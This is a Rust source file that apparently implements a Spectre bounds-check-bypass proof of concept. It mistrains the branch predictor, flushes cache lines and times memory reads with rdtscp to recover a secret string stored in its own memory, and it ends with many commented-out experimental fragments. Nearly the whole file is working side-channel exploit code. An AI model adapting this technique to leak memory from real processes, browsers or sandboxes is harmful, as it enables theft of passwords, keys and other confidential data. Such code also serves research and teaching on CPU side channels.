use rand::seq::SliceRandom;
use std::arch::asm;
use std::arch::x86_64::*;

const NUM_TRIES: u64 = 1000;
const TRAINING_LOOPS: usize = 100;
const ATTACK_LEAP: u64 = 10;
const INBETWEEN_DELAY: u64 = 100;

// const CACHE_HIT_THRESHOLD: u64 = 35;
// const LIKELY_THRESHOLD: u64 = (0.7 * NUM_TRIES as f64) as u64;

pub fn rdtscp() -> u64 {
    let eax: u32;
    let ecx: u32;
    let edx: u32;
    unsafe {
    asm!(
      "rdtscp",
      lateout("eax") eax,
      lateout("ecx") ecx,
      lateout("edx") edx,
      options(nomem, nostack)
    );
    }
    let counter: u64 = (edx as u64) << 32 | eax as u64;
    counter
}

fn init_attack() -> (Vec<bool>, Vec<u8>) {
    let mut is_attack = vec![false; TRAINING_LOOPS as usize];
    for i in (0..TRAINING_LOOPS).step_by(ATTACK_LEAP as usize) {
        is_attack[i as usize] = true;
    }

    let mut attack_pattern: Vec<u8> = (0..=255).collect();
    let mut rng = rand::thread_rng();
    attack_pattern.shuffle(&mut rng);

    println!("is_attack = {:?}", is_attack);
    println!("attack_pattern = {:?}", attack_pattern);

    (is_attack, attack_pattern)
}

#[inline(never)]
fn fetch_function(arr1: &[u8], arr1_len: &mut usize, arr2: &[u8], idx: usize) -> u8
{
    // This function simulates the behavior of the C++ `fetch_function`.
    // It returns values from the shared memory, based on the `idx`.

    let mut val: usize = 0;
    let arr1_ptr = arr1.as_ptr();

    if idx < *arr1_len
    {
      unsafe { val = *arr1_ptr.add(idx) as usize; }
      // val = arr1[idx] as usize;
      return arr2[val * 512]
    }
    0
}

#[inline(never)]
pub fn read_memory_byte(target_idx: usize, is_attack: &Vec<bool>, arr1: &[u8], arr1_len: &mut usize, arr2: &mut [u8], attack_pattern: &Vec<u8>, results: &mut [u32], idx: usize) -> u8 {

    let mut sum: u8 = 0;

    for elem in results.iter_mut() { *elem = 0; }

    for attempt in (1..NUM_TRIES).rev() {

        // flush arr2 from cache memory
        for i in 0..256 {
            unsafe { _mm_clflush(&arr2[i * 512]); }
        }

        let train_idx: usize = (attempt as usize) % arr1.len();
        // println!("train_idx #{}...", train_idx);

        for i in (0..TRAINING_LOOPS).rev()
        {
          unsafe { _mm_clflush(arr1_len as *const usize as *const u8); }
          // This loop executes the delay inbetween the successive training loops
          for _ in 0..INBETWEEN_DELAY
          {
            sum = sum - (sum ^ 0x5a);
          }
          unsafe { _mm_mfence(); }

          // We should avoid the if-else condition here, as the if-else invokes the use of branch predictor here, which will then detect our logic here
          let merged_idx = (is_attack[i] as usize) * target_idx + (!is_attack[i] as usize) * train_idx;
          // println!("target address = {:#02x}", arr1.as_ptr() as usize + merged_idx);

          /* Call the victim function with the training_x (to mistrain branch predictor) or target_x (to attack the SECRET address) */
          sum = fetch_function(arr1, arr1_len, arr2, merged_idx) - sum;
        }
        // unsafe { _mm_prefetch(&(arr2[idx * 512] as i8), _MM_HINT_T0); }

        // determine accessed line
        /* Here I have set a timing attack for each character */
        for i in (0..=255).rev() {
            /* The ATTACK PATTERN is set randomly that the system does not detect the pattern of attack (stride prediction by the system) */
            let curr_char: u8 = attack_pattern[i];  // ATTACK_PATTERN decides which character I will be setting the timing attack for
            let ival = (curr_char as usize) * 512;
            let time1 = rdtscp();
            let val = arr2[ival];  // address location which would have been prefetched, if the branch predictor prefetched this 'character'
            let time_diff = rdtscp() - time1; /* Read the timer and see what is the difference in earlier junk (fetched from CACHE) and this address*/
            sum = val - sum;  // address location which would have been prefetched, if the branch predictor prefetched this 'character'
            results[curr_char as usize] += time_diff as u32;
            // println!("time_diff = {}", time_diff);
            // if time_diff <= CACHE_HIT_THRESHOLD {
            //     results[curr_char as usize] = results[curr_char as usize] + 1; /* cache hit - add +1 to score for this value */
        }

    }

    sum
}


fn main() {

    let mut arr1: [u8; 16] = [17, 8, 24, 14, 3, 28, 6, 19, 9, 25, 11, 30, 5, 20, 16, 2];
    let mut secret: [u8; 20] = [72, 101, 108, 108, 111, 32, 87, 111, 114, 108, 100, 32, 72, 101, 108, 108, 111, 32, 32, 32];

    let count1 = rdtscp();
    let count2 = rdtscp();
    println!("The timer values are {} and {} (diff = {})", count1, count2, count2-count1);

    // This is where you would set up shared memory for arr1 and arr2, as in the C++ code.
    // You'll need to replace these placeholders with actual memory setup.
    let mut arr2: [u8; 256 * 512] = [0; 256 * 512]; // Placeholder, initialize with appropriate values
    let mut results: [u32; 256] = [0; 256];
    let mut target_idx: usize;
    let mut arr1_len: usize = arr1.len();

    unsafe {
        target_idx = (secret.as_ptr().offset_from(arr1.as_ptr())) as usize; /* Its value is the difference in the address of SECRET KEY and arr1*/
        println!("Distance to secret array = {} ({:#02x} -> {:#02x})", target_idx, arr1.as_ptr() as usize, secret.as_ptr() as usize);
    }

    // The init function will initialize the IS_ATTACK and ATTACK_PATTERN
    let (is_attack, attack_pattern) = init_attack();

    // set all values of arr2 as 1
    for i in 0..arr2.len() {
        arr2[i] = 1; /* write to arr2 so in RAM not copy-on-write zero pages */
    }

    println!("Reading {} bytes from target ::", arr1.len());
    let mut guessed_secret = String::new(); // This will store the most-likely value of the SECRET_KEY overall
    let mut sum: u8 = 0;
    for i in 0..secret.len() {
        println!("Reading at Target Address = {}", target_idx + i);

        sum = read_memory_byte(target_idx + i, &is_attack, &arr1, &mut arr1_len, &mut arr2, &attack_pattern, &mut results, attack_pattern[0] as usize) - sum;
        // println!("results = {:?}", results);
        // results[b'q' as usize] = 999;

        /* get the most likely character */
        let mut most_likely_char: u8 = b'?';
        let mut min_result: u32 = 9999999;
        for i in 0..256 {
           let curr_char: u8 = attack_pattern[i];
           if results[curr_char as usize] < min_result && curr_char > 31 && curr_char < 127 {
             min_result = results[curr_char as usize];
             most_likely_char = curr_char;
           }
        }
        println!("Char: '{}', Score: {}, Sum: {}", most_likely_char as char, min_result, sum);

        guessed_secret.push(most_likely_char as char);
    }

    println!("Guessed secret = {}", guessed_secret);

}














/*

// Counter for high-speed timer
// Donayam's suggestion
static TIMER_COUNTER: AtomicU64 = AtomicU64::new(0);

fn high_speed_timer() {
    loop {
        TIMER_COUNTER.fetch_add(1, Ordering::Relaxed);
    }
}

    // Create a separate thread for high-speed timer
    let timer_thread = thread::spawn(|| high_speed_timer());

    // Terminate the timer thread
    timer_thread.join().unwrap();

    // Set the CPU affinity for the main thread
    /* core_affinity::set_for_current(core_affinity::get(core_affinity::CpuSet::new(0)).unwrap()); */

*/


    // let time_start = rdtscp();
    // for _ in (1..1000) {
    //  unsafe { _mm_clflush(&arr2[0]); }
    //  sum = arr2[0] - sum;
    // }
    // let time_diff = rdtscp() - time_start;
    // println!("Average time with clflush: {}", (time_diff as f64)/(1000 as f64));


    // let time_start = rdtscp();
    // for _ in (1..1000) {
    //  unsafe { _mm_prefetch(&(arr2[0] as i8), _MM_HINT_T0); }
    //  sum = arr2[0] - sum;
    // }
    // let time_diff = rdtscp() - time_start;
    // println!("Average time without clflush: {}", (time_diff as f64)/(1000 as f64));

/*
#[inline(always)]
fn rdtsc() -> u64 {
    let mut now: u64 = 0;
    let mut aux: u32 = 0;
    // let high: u32;
    // let low: u32;
    unsafe {
        // asm!("rdtscp", out("eax") low, out("edx") high);
        now = core::arch::x86_64::__rdtscp(&mut aux);
    }
    // (high as u64) << 32 | low as u64
    now
}
*/

/*
#[inline(always)]
unsafe fn clflush(addr: *const u8) {
    asm!("clflush {0}", in(reg) addr);
}
*/

/*

        for i in (0..TRAINING_LOOPS).rev() {
            // Flush arr1_size from cache memory
            unsafe {
                clflush(&arr1_size as *const usize as *const u8);
            }

            // Add in-between delay cycles
            for _ in 0..INBETWEEN_DELAY {
                // You can implement a delay mechanism here
            }

            let idx = if is_attack[i as usize] {
                target_idx
            } else {
                train_idx
            };

            // Call the victim function with the training_x (to mistrain branch predictor) or target_x (to attack the SECRET address)
            fetch_function(&arr1, &arr2, idx, &mut results);

            // Implement the timing attack logic here to measure cache access times for each character and update the `results` array
        }

        // Calculate the most likely character based on the results array and push it into the secret string
        let mut most_likely_char = '?';
        for i in (0..256).rev() {
            let curr_char = attack_pattern[i as usize];
            if u64::from(results[curr_char as usize]) >= LIKELY_THRESHOLD {
                if curr_char >= 31 && curr_char <= 127 {
                    most_likely_char = curr_char as char;
                    break;
                }
            }
        }
        secret.push(most_likely_char as char);
*/

    // let arr1_size = arr1.len();
    // let target_idx = SECRET.as_ptr() as usize - arr1.as_ptr() as usize;
    // let guessed_secret = read_memory_byte(target_idx, arr1_len, is_attack, &arr1, &arr2, attack_pattern);
    // println!("THE GUESSED SECRET IS :: {}", guessed_secret);


        // fetch one line
        // unsafe { _mm_prefetch(&(arr2[idx * 512] as i8), _MM_HINT_T0); }
        // sum = arr2[idx * 512] - sum;
        // sum = arr2[idx * 512] / sum;
        // sum = arr2[idx * 512] - sum;

/*
fn fetch_function(arr1: &[u8], arr2: &[u8], idx: usize, results: &mut [u32; 256]) {
    // This function simulates the behavior of the C++ `fetch_function`.
    // It returns values from the shared memory, based on the `idx`.

    if idx < arr1.len() {
        // Ensure the index is within bounds of arr1_size
        let arr1_idx = arr1[idx] as usize;
        if arr1_idx < arr2.len() / 512 {
            // Calculate the index for arr2 based on arr1
            let arr2_idx = arr1_idx * 512;
            
            // Simulate cache access time measurement (you may need to adjust this)
            let mut time1: u64 = 0;
            let mut time2: u64 = 0;
            let junk: u64 = 0;
            
            /*
            unsafe {
                asm!(
                    "lfence",
                    "rdtscp",
                    "mov {}, rax",
                    "clflush [$0]",
                    "rdtscp",
                    "mov {}, rax",
                    "lfence",
                    out(reg) time1 => _,
                    in(reg) arr2_idx => _,
                    out(reg) junk => _,
                    out(reg) time2 => _,
                );
            }
            */
            
            if time2 - time1 <= CACHE_HIT_THRESHOLD {
                // Cache hit, update the results
                results[arr2[arr2_idx] as usize] += 1;
            }
        }
    }
}
*/

    // use rand::Rng;

    // let mut rng = rand::thread_rng();
    // for i in (0..blast_array.len()).step_by(32) {
    //   blast_array[i] = rng.gen();
    // }

    // let mut blast_array: [u8; 128*1024] = [0; 128*1024];

        // for i in (0..blast_array.len()).step_by(16) {
        //   sum = blast_array[i] - sum;
        // }

